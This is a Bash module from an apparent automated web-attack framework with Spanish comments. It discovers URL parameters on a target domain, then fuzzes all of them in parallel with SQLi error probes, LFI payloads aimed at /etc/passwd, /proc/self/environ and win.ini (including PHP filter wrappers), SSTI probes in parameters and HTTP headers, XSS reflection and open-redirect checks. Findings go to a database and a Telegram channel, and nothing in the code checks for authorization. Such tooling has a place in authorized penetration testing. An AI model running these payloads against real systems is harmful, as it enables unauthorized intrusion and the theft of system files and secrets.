#!/usr/bin/env bash
# ============================================================
#  modules/15_param_discovery.sh
#  Fase 15: Descubrimiento de parámetros ocultos
#
#  Herramientas:
#    - paramspider : extrae params históricos (Wayback/CommonCrawl)
#    - arjun       : fuzzing activo en raíces + paths de API
#
#  Estrategia:
#    1. paramspider descubre parámetros conocidos en el histórico
#    2. URLs con params del crawler previo (katana)
#    3. arjun fuzzea params ocultos en:
#         a) raíces de subdominios alive
#         b) paths de API/app descubiertos por katana
#    4. Todo entra en url_params (DB) y en la rueda de URLs
# ============================================================

MODULE_NAME="param_discovery"
MODULE_DESC="Descubrimiento de parámetros ocultos (paramspider + arjun + fuzz)"

# ── Fuzzing genérico de parámetros descubiertos ───────────────
# Aplica payloads universales a TODOS los params encontrados — sin cap.
# Workers paralelos con semáforo para no bloquear el host.
# Detecta: SQLi error-based, LFI (multi-payload+encoding), SSTI (multi-engine),
#          XSS reflection, open redirect.
_param_fuzz() {
  local PARAMS_FILE="$1"
  local DOMAIN_ID="$2"
  local DOMAIN="$3"

  [[ ! -s "$PARAMS_FILE" ]] && return

  local MAX_WORKERS=20          # paralelo controlado
  local FINDINGS_FILE
  FINDINGS_FILE=$(mktemp /tmp/pf_findings.XXXXXX)
  local DONE_FILE
  DONE_FILE=$(mktemp /tmp/pf_done.XXXXXX)
  local URL_COUNT=0

  # ── LFI: payloads con encodings + wrappers PHP ───────────────
  local -a LFI_PAYLOADS=(
    '../../../etc/passwd'
    '....//....//....//etc/passwd'
    '../../../etc/passwd%00'
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd'
    '..%2f..%2f..%2fetc%2fpasswd'
    'php://filter/convert.base64-encode/resource=/etc/passwd'
    'php://filter/read=convert.base64-encode/resource=../../../etc/passwd'
    '../../../proc/self/environ'
    '../../../windows/win.ini'
    '..\..\..\windows\win.ini'
  )
  # Patrones de detección LFI (Linux + Windows + PHP wrapper base64)
  local LFI_DETECT='root:[x*]?:[0-9]+:[0-9]+:|/bin/(bash|sh|nologin)|www-data:|daemon:|HTTP_USER_AGENT|DB_PASS|database_password|\[boot loader\]\s*\[operating systems\]|[a-zA-Z0-9+/]{40,}={0,2}'

  # ── SSTI: múltiples engines ──────────────────────────────────
  # Cada entrada: "payload:::marker_en_respuesta"
  local -a SSTI_PROBES=(
    '{{7*7}}:::49'          # Jinja2, Twig, Pebble
    '${7*7}:::49'           # Freemarker, Groovy, Spring EL
    '<%= 7*7 %>:::49'       # ERB (Ruby), JSP EL
    '{7*7}:::49'            # Smarty, Plates
    '#{7*7}:::49'           # Thymeleaf (Spring)
    '{{7*"7"}}:::7777777'   # Jinja2 string multiply
  )

  # ── Worker: testa una URL completa ──────────────────────────
  _fuzz_url() {
    local URL="$1"
    local BASE="${URL%%\?*}"
    local QUERY="${URL#*\?}"

    # Baseline: detectar método
    local BASELINE_STATUS METHOD="GET"
    BASELINE_STATUS=$(curl -s --max-time 8 -A "${SCAN_UA:-Mozilla/5.0}" \
      -o /dev/null -w "%{http_code}" "$BASE" 2>/dev/null)
    if [[ "$BASELINE_STATUS" =~ ^(000|4[0-9][0-9])$ ]]; then
      BASELINE_STATUS=$(curl -s --max-time 8 -A "${SCAN_UA:-Mozilla/5.0}" -X POST \
        --data-urlencode "" -o /dev/null -w "%{http_code}" "$BASE" 2>/dev/null)
      [[ "$BASELINE_STATUS" =~ ^(000|4[0-9][0-9])$ ]] && return
      METHOD="POST"
    fi

    _send_payload() {
      local U="$1" PNAME="$2" PAYLOAD="$3" M="$4" Q="$5"
      local ENC_PAYLOAD B="${U%%\?*}"
      ENC_PAYLOAD=$(python3 -c \
        "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1],safe=''))" \
        "$PAYLOAD" 2>/dev/null || printf '%s' "$PAYLOAD")
      local RESP
      if [[ "$M" == "POST" ]]; then
        local PB
        PB=$(echo "$Q" | tr '&' '\n' | \
          sed -E "s|^(${PNAME}=).*|\1${ENC_PAYLOAD}|" | \
          tr '\n' '&' | sed 's/&$//')
        RESP=$(curl -s --max-time 10 -A "${SCAN_UA:-Mozilla/5.0}" -X POST \
          -d "$PB" -w "\n###S###%{http_code}" "$B" 2>/dev/null)
      else
        local TU
        TU=$(echo "$U" | sed -E "s|([?&]${PNAME}=)[^&]*|\1${ENC_PAYLOAD}|")
        RESP=$(curl -s --max-time 10 -A "${SCAN_UA:-Mozilla/5.0}" \
          -w "\n###S###%{http_code}" "$TU" 2>/dev/null)
      fi
      echo "$RESP"
    }

    while IFS='=' read -r PNAME _; do
      [[ -z "$PNAME" || "$PNAME" == "FUZZ" ]] && continue
      local PNAME_CLEAN="${PNAME// /}"

      # ── SQLi ──────────────────────────────────────────────
      local R
      R=$(_send_payload "$URL" "$PNAME_CLEAN" "'" "$METHOD" "$QUERY")
      local RBODY="${R%###S###*}"
      if echo "$RBODY" | grep -qiE \
        "sql syntax|mysql_fetch|ORA-[0-9]{4,}|postgresql.*error|sqlite.*error|\
odbc.*driver|unclosed quotation|syntax error.*near|you have an error in your sql|\
warning.*mysql|division by zero|supplied argument is not a valid|pg_query\(\)|DB Error"; then
        echo "sqli_error|high|${URL}|SQLi error-based en param '${PNAME_CLEAN}'" \
          >> "$FINDINGS_FILE"
      fi

      # ── SSTI ─────────────────────────────────────────────
      local PROBE MARKER
      for PROBE_ENTRY in "${SSTI_PROBES[@]}"; do
        PROBE="${PROBE_ENTRY%:::*}"
        MARKER="${PROBE_ENTRY#*:::}"
        R=$(_send_payload "$URL" "$PNAME_CLEAN" "$PROBE" "$METHOD" "$QUERY")
        RBODY="${R%###S###*}"
        if echo "$RBODY" | grep -qF "$MARKER"; then
          echo "ssti|critical|${URL}|SSTI confirmado (${PROBE}=${MARKER}) en param '${PNAME_CLEAN}'" \
            >> "$FINDINGS_FILE"
          break
        fi
      done

      # ── XSS ──────────────────────────────────────────────
      R=$(_send_payload "$URL" "$PNAME_CLEAN" '<h4ckeadora>' "$METHOD" "$QUERY")
      RBODY="${R%###S###*}"
      if echo "$RBODY" | grep -qF '<h4ckeadora>'; then
        # Confirmar con dalfox si disponible
        local DALFOX_OUT=""
        if command -v dalfox &>/dev/null; then
          DALFOX_OUT=$(dalfox url "$URL" \
            --silence --no-spinner --timeout 15 \
            --user-agent "${SCAN_UA:-Mozilla/5.0}" \
            2>/dev/null | grep -i "POC\|XSS" | head -3)
        fi
        echo "xss_reflect|medium|${URL}|XSS reflection param '${PNAME_CLEAN}' dalfox=${DALFOX_OUT}" \
          >> "$FINDINGS_FILE"
      fi

      # ── LFI — sólo en params con nombres sospechosos ─────
      if echo "$PNAME_CLEAN" | grep -qiE \
        "^(file|path|include|page|load|template|src|doc|document|folder|root|\
read|pg|php_path|style|pdf|fn|filename|dir|directory|module|content|layout|conf|config)$"; then
        local LFI_HIT=0
        local USED_PAYLOAD=""
        for LFI_P in "${LFI_PAYLOADS[@]}"; do
          R=$(_send_payload "$URL" "$PNAME_CLEAN" "$LFI_P" "$METHOD" "$QUERY")
          RBODY="${R%###S###*}"
          # PHP wrapper: el body será base64, buscar longitud razonable
          if echo "$RBODY" | grep -qE "$LFI_DETECT"; then
            LFI_HIT=1
            USED_PAYLOAD="$LFI_P"
            break
          fi
        done
        if [[ "$LFI_HIT" -eq 1 ]]; then
          echo "lfi|critical|${URL}|LFI en param '${PNAME_CLEAN}' payload='${USED_PAYLOAD}'" \
            >> "$FINDINGS_FILE"
        fi
      fi

      # ── Open Redirect ─────────────────────────────────────
      if echo "$PNAME_CLEAN" | grep -qiE \
        "^(url|redirect|next|dest|target|href|link|uri|location|return|ref|goto|redir|forward|continue|back)$"; then
        R=$(_send_payload "$URL" "$PNAME_CLEAN" '//a.fernandes.es' "$METHOD" "$QUERY")
        local RSTATUS="${R##*###S###}"
        if [[ "$RSTATUS" =~ ^3 ]]; then
          local LOC
          LOC=$(curl -sI --max-time 8 -A "${SCAN_UA:-Mozilla/5.0}" \
            "$(echo "$URL" | sed -E "s|([?&]${PNAME_CLEAN}=)[^&]*|\1%2F%2Fa.fernandes.es|")" \
            2>/dev/null | grep -i '^location:' | head -1)
          if echo "$LOC" | grep -qi "a\.fernandes\.es"; then
            echo "open_redirect|medium|${URL}|Open redirect param '${PNAME_CLEAN}' → ${LOC}" \
              >> "$FINDINGS_FILE"
          fi
        fi
      fi

    done < <(echo "$QUERY" | tr '&' '\n')

    # ── SSTI en headers — independiente de params ─────────────
    # Muchos frameworks renderizan User-Agent, Referer y headers custom
    # directamente en templates (logging, error pages, email templates, etc.)
    local SSTI_HEADERS=(
      "User-Agent"
      "Referer"
      "X-Forwarded-For"
      "X-Forwarded-Host"
      "X-Original-URL"
      "X-Custom-IP-Authorization"
      "X-Api-Version"
      "Accept-Language"
      "X-Filename"
      "X-Template"
    )
    local PROBE_ENTRY PROBE MARKER HDR
    for PROBE_ENTRY in "${SSTI_PROBES[@]}"; do
      PROBE="${PROBE_ENTRY%:::*}"
      MARKER="${PROBE_ENTRY#*:::}"
      for HDR in "${SSTI_HEADERS[@]}"; do
        local HRESP HBODY
        HRESP=$(curl -s --max-time 10 -A "${SCAN_UA:-Mozilla/5.0}" \
          -H "${HDR}: ${PROBE}" \
          -w "\n###S###%{http_code}" "$BASE" 2>/dev/null)
        HBODY="${HRESP%###S###*}"
        if echo "$HBODY" | grep -qF "$MARKER"; then
          echo "ssti|critical|${URL}|SSTI en header '${HDR}' (${PROBE}=${MARKER})" \
            >> "$FINDINGS_FILE"
          break 2
        fi
      done
    done
  }

  # ── Dispatcher paralelo con semáforo ─────────────────────────
  local ACTIVE=0
  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue
    [[ "$URL" =~ \.(js|css|png|jpg|gif|svg|woff|ico|map|ttf|woff2)(\?|$) ]] && continue
    (( URL_COUNT++ ))

    ( _fuzz_url "$URL" ) &

    (( ++ACTIVE ))
    if (( ACTIVE >= MAX_WORKERS )); then
      wait -n 2>/dev/null || wait
      ACTIVE=0
    fi
  done < "$PARAMS_FILE"
  wait

  # ── Procesar resultados y guardar en DB ───────────────────────
  local FINDINGS=0
  while IFS='|' read -r FTYPE FSEV FURL FDETAIL; do
    [[ -z "$FTYPE" ]] && continue
    log_warn "  ⚡ ${FTYPE}: ${FURL} — ${FDETAIL}"
    db_add_finding "$DOMAIN_ID" "$FTYPE" "$FSEV" "$FURL" \
      "param_fuzz" "$FDETAIL"
    notify_nuclei_finding "$DOMAIN" "$FTYPE" "$FSEV" "$FURL" "$FDETAIL"
    (( FINDINGS++ ))
  done < "$FINDINGS_FILE"

  rm -f "$FINDINGS_FILE" "$DONE_FILE"

  log_ok "  param_fuzz: $FINDINGS findings en $URL_COUNT URLs (${MAX_WORKERS} workers paralelos)"
}

# ── Parsear salida JSON de arjun (robusta ante cambios de versión) ──
# arjun v2 produce: {"url": {"GET": ["p1","p2"], "POST": ["p3"]}}
# arjun v1 produce: {"url": ["p1","p2"]}
# Devuelve líneas con formato: url?p1=FUZZ&p2=FUZZ
_parse_arjun_json() {
  local JSON_FILE="$1"
  python3 - "$JSON_FILE" <<'PYEOF'
import json, sys

try:
    data = json.load(open(sys.argv[1]))
except Exception:
    sys.exit(0)

for url, val in data.items():
    params = []
    if isinstance(val, list):
        # formato v1
        params = val
    elif isinstance(val, dict):
        # formato v2: {"GET": [...], "POST": [...]}
        for method_params in val.values():
            if isinstance(method_params, list):
                params.extend(method_params)

    if params:
        qs = "&".join(f"{p}=FUZZ" for p in params if p)
        print(f"{url}?{qs}")
PYEOF
}

module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 15 — $MODULE_DESC: $DOMAIN"

  local URLS_RAW="$OUT_DIR/urls_raw.txt"
  local ALIVE="$OUT_DIR/subs_alive.txt"
  local PARAMS_OUT="$OUT_DIR/params_found.txt"
  > "$PARAMS_OUT"

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check

  local ARJUN_PROXY=""
  $PROXY_ACTIVE && ARJUN_PROXY="--proxy $PROXY_URL"
  local DOMAIN_RE="${DOMAIN//./\\.}"

  # Detect single-target mode: avoid pulling params from entire domain
  local SINGLE_SUB=""
  if [[ -s "$ALIVE" && "$(wc -l < "$ALIVE" | tr -d ' ')" == "1" ]]; then
    SINGLE_SUB=$(head -1 "$ALIVE" | tr -d '[:space:]')
  fi

  # ── 1. ParamSpider — histórico de Wayback/CommonCrawl ────────
  if command -v paramspider &>/dev/null; then
    if [[ -n "$SINGLE_SUB" ]]; then
      # Single-target: only spider the specific subdomain, skip domain-wide scan
      log_info "paramspider sobre $SINGLE_SUB (single-target mode)..."
      timeout 90 paramspider -d "$SINGLE_SUB" -s 2>/dev/null \
        | grep -iE "https?://(([a-z0-9-]+\.)*${DOMAIN//./\\.})" \
        | grep '?' \
        >> "$PARAMS_OUT" || true
    else
      log_info "paramspider sobre $DOMAIN..."
      timeout 90 paramspider -d "$DOMAIN" -s 2>/dev/null \
        | grep -iE "https?://(([a-z0-9-]+\.)*${DOMAIN//./\\.})" \
        | grep '?' \
        >> "$PARAMS_OUT" || true
    fi

    if [[ -z "$SINGLE_SUB" && -s "$ALIVE" ]]; then
      local SUB_COUNT
      SUB_COUNT=$(wc -l < "$ALIVE" | tr -d ' ')
      log_info "paramspider sobre $SUB_COUNT subdominios (paralelo)..."

      local SPIDER_TMP="$OUT_DIR/.paramspider_subs"
      mkdir -p "$SPIDER_TMP"

      while IFS= read -r SUB; do
        [[ -z "$SUB" ]] && continue
        (
          timeout 60 paramspider -d "$SUB" -s 2>/dev/null \
            | grep -iE "https?://(([a-z0-9-]+\.)*${DOMAIN//./\\.})" \
            | grep '?' \
            > "$SPIDER_TMP/${SUB}.txt" 2>/dev/null || true
        ) &
      done < "$ALIVE"
      wait

      cat "$SPIDER_TMP"/*.txt 2>/dev/null >> "$PARAMS_OUT" || true
      rm -rf "$SPIDER_TMP"
    fi

    sort -u "$PARAMS_OUT" -o "$PARAMS_OUT"
    log_ok "paramspider: $(wc -l < "$PARAMS_OUT" | tr -d ' ') URLs con params"
  else
    log_warn "paramspider no encontrado — instala: pip3 install git+https://github.com/devanshbatham/paramspider"
  fi

  # ── 2. Todas las URLs con params acumuladas en DB ────────────
  # Lee de la tabla urls (katana + js_analyzer + auth_crawler + asn + etc.)
  # para garantizar que ningún módulo previo se quede sin procesar sus params.
  sqlite3 "$DB_PATH" \
    "SELECT url FROM urls
     WHERE domain_id=${DOMAIN_ID} AND url LIKE '%?%';" \
    2>/dev/null >> "$PARAMS_OUT" || true

  # También del fichero urls_raw.txt por si la DB tuviera lag de escritura
  if [[ -s "$URLS_RAW" ]]; then
    grep -P '\?' "$URLS_RAW" \
      | grep -iP "^https?://([a-z0-9_-]+\.)*${DOMAIN_RE}([/:#?]|$)" \
      >> "$PARAMS_OUT" 2>/dev/null || true
  fi

  sort -u "$PARAMS_OUT" -o "$PARAMS_OUT"
  log_info "Tras merge con DB+crawler: $(wc -l < "$PARAMS_OUT" | tr -d ' ') URLs con params"

  # ── 3. Arjun — fuzzing activo de params ocultos ──────────────
  if command -v arjun &>/dev/null; then
    local ARJUN_TMP="$OUT_DIR/.arjun_targets.txt"
    local ARJUN_OUT="$OUT_DIR/.arjun_results.json"
    > "$ARJUN_TMP"

    # a) Raíces de subdominios alive (descubre params globales en /)
    if [[ -s "$ALIVE" ]]; then
      sed 's|^|https://|' "$ALIVE" >> "$ARJUN_TMP"
    fi

    # b) Paths de API/app descubiertos por katana
    #    Solo rutas con aspecto de endpoint (sin extensión de fichero estático)
    #    Máx 200 para no eternizar el scan
    if [[ -s "$URLS_RAW" ]]; then
      grep -iP "^https?://([a-z0-9_-]+\.)*${DOMAIN_RE}([/:#?]|$)" "$URLS_RAW" \
        | grep -iP '/(api|v\d|graphql|rest|admin|app|service|endpoint|query|search|login|auth|user|account|order|payment|checkout)' \
        | grep -vP '\.(js|css|png|jpg|gif|svg|ico|woff|ttf|pdf|zip)(\?|$)' \
        | grep -vP '\?' \
        | sort -u \
        | head -200 \
        >> "$ARJUN_TMP" || true
    fi

    sort -u "$ARJUN_TMP" -o "$ARJUN_TMP"
    local ARJUN_TARGET_COUNT
    ARJUN_TARGET_COUNT=$(wc -l < "$ARJUN_TMP" | tr -d ' ')

    if [[ "$ARJUN_TARGET_COUNT" -gt 0 ]]; then
      log_info "arjun fuzzing activo sobre $ARJUN_TARGET_COUNT targets (GET + POST)..."

      # GET params
      timeout 300 arjun \
        -i  "$ARJUN_TMP" \
        -oJ "$ARJUN_OUT" \
        -m  GET \
        --stable \
        -t  10 \
        ${ARJUN_PROXY} \
        2>/dev/null || true

      if [[ -s "$ARJUN_OUT" ]]; then
        _parse_arjun_json "$ARJUN_OUT" >> "$PARAMS_OUT" || true
        log_ok "arjun GET: $(wc -l < "$ARJUN_OUT" | tr -d ' ') respuestas"
        rm -f "$ARJUN_OUT"
      fi

      # POST params — solo sobre endpoints que no sean recursos estáticos
      timeout 300 arjun \
        -i  "$ARJUN_TMP" \
        -oJ "$ARJUN_OUT" \
        -m  POST \
        --stable \
        -t  10 \
        ${ARJUN_PROXY} \
        2>/dev/null || true

      if [[ -s "$ARJUN_OUT" ]]; then
        _parse_arjun_json "$ARJUN_OUT" >> "$PARAMS_OUT" || true
        log_ok "arjun POST: completado"
        rm -f "$ARJUN_OUT"
      fi
    fi

    rm -f "$ARJUN_TMP"
  else
    log_warn "arjun no encontrado — instala: pip3 install arjun"
  fi

  sort -u "$PARAMS_OUT" -o "$PARAMS_OUT"
  local TOTAL_PARAMS
  TOTAL_PARAMS=$(wc -l < "$PARAMS_OUT" | tr -d ' ')
  log_info "$TOTAL_PARAMS URLs con parámetros encontradas en total"

  # ── 4. Guardar en DB y añadir a la rueda ─────────────────────
  local NEW_PARAMS=0

  while IFS= read -r PARAM_URL; do
    [[ -z "$PARAM_URL" ]] && continue

    local BASE="${PARAM_URL%%\?*}"
    local QUERY="${PARAM_URL#*\?}"

    # Guardar cada param individualmente — proceso sustitución para que
    # NEW_PARAMS++ sea visible en el scope padre (evita subshell de pipe)
    while IFS='=' read -r PNAME _; do
      [[ -z "$PNAME" ]] && continue
      local PNAME_CLEAN="${PNAME// /}"
      local BASE_ESC="${BASE//\'/\'\'}"
      local PNAME_ESC="${PNAME_CLEAN//\'/\'\'}"

      local BEFORE
      BEFORE=$(sqlite3 "$DB_PATH" \
        "SELECT COUNT(*) FROM url_params
         WHERE domain_id=${DOMAIN_ID} AND url='${BASE_ESC}' AND param_name='${PNAME_ESC}';" \
        2>/dev/null || echo "1")

      sqlite3 "$DB_PATH" \
        "INSERT OR IGNORE INTO url_params(domain_id,url,param_name,source)
         VALUES(${DOMAIN_ID},'${BASE_ESC}','${PNAME_ESC}','param_discovery');" \
        2>/dev/null || true

      [[ "${BEFORE:-1}" == "0" ]] && ((NEW_PARAMS++))

    done < <(echo "$QUERY" | tr '&' '\n')

    # URL completa (con params) entra en la rueda para nuclei/fuzzing
    db_add_url "$DOMAIN_ID" "$PARAM_URL" "param_discovery" ""

  done < "$PARAMS_OUT"

  # ── 5. Notificar params jugosos ───────────────────────────────
  local JUICY_PATTERN='[?&](url|redirect|next|dest|target|path|file|page|include|src|href|link|load|fetch|request|uri|site|html|data|ref|return|callback|id|user|uid|account|admin|token|key|api|secret|pass|pwd|auth|session|cmd|exec|command|query|search|q|input|debug|test|env)\b'

  local JUICY_PARAMS
  JUICY_PARAMS=$(grep -ioP "$JUICY_PATTERN" "$PARAMS_OUT" 2>/dev/null \
    | sed 's/^[?&]//' | sort -u | tr '\n' ', ' | sed 's/,$//')

  if [[ -n "$JUICY_PARAMS" ]]; then
    log_warn "🎯 Parámetros jugosos detectados: $JUICY_PARAMS"
    _telegram_send "🎯 *Parámetros interesantes encontrados*
🌐 \`${DOMAIN}\`
📊 Total URLs con params: \`${TOTAL_PARAMS}\`
🆕 Parámetros nuevos: \`${NEW_PARAMS}\`
⚡ Jugosos: \`${JUICY_PARAMS:0:300}\`
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
  fi

  # ── 6. Fuzzing genérico de parámetros ────────────────────────
  # Ejecutar solo si hay params y el target no está en blanket-403
  if [[ "$TOTAL_PARAMS" -gt 0 ]]; then
    log_info "Fuzzing genérico de parámetros (SQLi, LFI, SSTI, XSS, redirect)..."
    _param_fuzz "$PARAMS_OUT" "$DOMAIN_ID" "$DOMAIN"
  fi

  log_ok "$MODULE_DESC completado: $TOTAL_PARAMS URLs, $NEW_PARAMS params nuevos"
}
